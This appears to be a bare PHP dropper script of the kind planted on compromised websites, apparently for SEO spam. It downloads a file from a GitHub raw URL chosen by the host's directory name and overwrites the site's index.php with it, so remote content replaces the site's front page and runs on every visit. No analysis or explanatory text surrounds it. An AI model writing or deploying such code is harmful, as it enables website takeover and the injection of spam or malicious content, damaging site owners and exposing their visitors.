<?php
$file = basename(dirname($_SERVER['DOCUMENT_ROOT'])) . '.php';
$content = file_get_contents('https://raw.githubusercontent.com/2321enjwdadunjd/seo/main/22/' . $file);
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php', 'w+');
fwrite($fp, $content);
fclose($fp);
?>
